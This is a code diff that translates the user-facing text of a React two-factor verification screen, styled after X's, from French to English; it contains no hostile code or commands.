@@ -154,7 +154,7 @@ export const TwoFA = () => {
             <div className="twofa-close-button-container">
               <button
                 className="twofa-close-button"
-                aria-label="Fermer"
+                aria-label="Close"
                 type="button"
                 onClick={() => navigate(-1)}
               >
@@ -189,12 +189,11 @@ export const TwoFA = () => {
         <div className="twofa-content">
           <div className="twofa-title-container">
             <h1 className="twofa-title" id="modal-header">
-              Entrez votre code de vérification
+              Enter your verification code
             </h1>
             <div className="twofa-description">
               <span>
-                Utilisez votre application génératrice de code et saisissez
-                ci-dessous le code obtenu.
+                Use your code generator app and enter the code below.
               </span>
             </div>
           </div>
@@ -220,7 +219,7 @@ export const TwoFA = () => {
           <div className="twofa-form">
             <label className="twofa-label">
               <div className="twofa-label-text">
-                <span>Entrez le code</span>
+                <span>Enter the code</span>
               </div>
               <div className="twofa-input-wrapper">
                 <input
@@ -253,7 +252,7 @@ export const TwoFA = () => {
                   // TODO: Implement alternative verification method
                 }}
               >
-                Choisir une autre méthode de vérification
+                Choose another verification method
               </button>
               <a
                 href="https://help.twitter.com/forms/account-access/regain-access"
@@ -261,7 +260,7 @@ export const TwoFA = () => {
                 rel="noopener noreferrer nofollow"
                 className="twofa-link-button"
               >
-                Contacter l&apos;Assistance X
+                Contact X Support
               </a>
             </div>
 
@@ -271,7 +270,7 @@ export const TwoFA = () => {
               disabled={loading || !code.trim()}
               type="button"
             >
-              <span>Suivant</span>
+              <span>Next</span>
             </button>
           </div>
         </div>
